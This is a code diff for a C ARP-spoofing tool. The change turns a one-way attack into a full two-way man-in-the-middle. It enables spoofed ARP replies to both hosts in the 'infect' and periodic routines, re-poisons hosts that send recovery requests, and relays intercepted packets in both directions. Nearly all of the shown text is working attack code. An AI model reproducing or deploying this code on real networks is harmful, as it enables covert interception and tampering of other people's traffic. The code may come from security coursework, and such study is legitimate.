@@ -205,7 +205,7 @@ void *infect_periodic(void *arg)
 {
     while( 1 ) {
         send_arprply_pckt(&sender_ip, sender_mac, &receiver_ip);
-        // send_arprply_pckt(&receiver_ip, receiver_mac, &sender_ip);
+        send_arprply_pckt(&receiver_ip, receiver_mac, &sender_ip);
         sleep(1);
     }
 }
@@ -231,7 +231,7 @@ void *prvnt_recov_dorelay(void *arg)
             eth_arp = (struct ether_arp *)(packet + sizeof(struct ether_header));
             if(ntohs(eth_arp->ea_hdr.ar_op) == ARPOP_REQUEST) {         // detected arp recovery
                 send_arprply_pckt(&sender_ip, sender_mac, &receiver_ip);
-                // send_arprply_pckt(&receiver_ip, receiver_mac, &sender_ip);
+                send_arprply_pckt(&receiver_ip, receiver_mac, &sender_ip);
             }
         }
         else if(ntohs(eth_hdr->ether_type) == ETHERTYPE_IP) {           // normal IP packet must be relayed
@@ -244,7 +244,6 @@ void *prvnt_recov_dorelay(void *arg)
                 pcap_sendpacket(handle, relay_pckt, header.len);
                 free(relay_pckt);
             }
-            /*
             else if(!memcmp(eth_hdr->ether_shost, receiver_mac, ETH_ALEN) && !memcmp(&(ip_hdr->ip_dst), &sender_ip, 4)) {
                 relay_pckt = (u_char *)malloc(header.len);              // from receiver to sender
                 memcpy(relay_pckt, packet, header.len);
@@ -253,7 +252,6 @@ void *prvnt_recov_dorelay(void *arg)
                 pcap_sendpacket(handle, relay_pckt, header.len);
                 free(relay_pckt);
             }
-            */
         }
     }
 }
@@ -264,7 +262,7 @@ void infect()
     pthread_t tid[2];
 
     send_arprply_pckt(&sender_ip, sender_mac, &receiver_ip);
-    // send_arprply_pckt(&receiver_ip, receiver_mac, &sender_ip);
+    send_arprply_pckt(&receiver_ip, receiver_mac, &sender_ip);
 
     pthread_create(&tid[0], NULL, infect_periodic, NULL);
     pthread_create(&tid[1], NULL, prvnt_recov_dorelay, NULL);
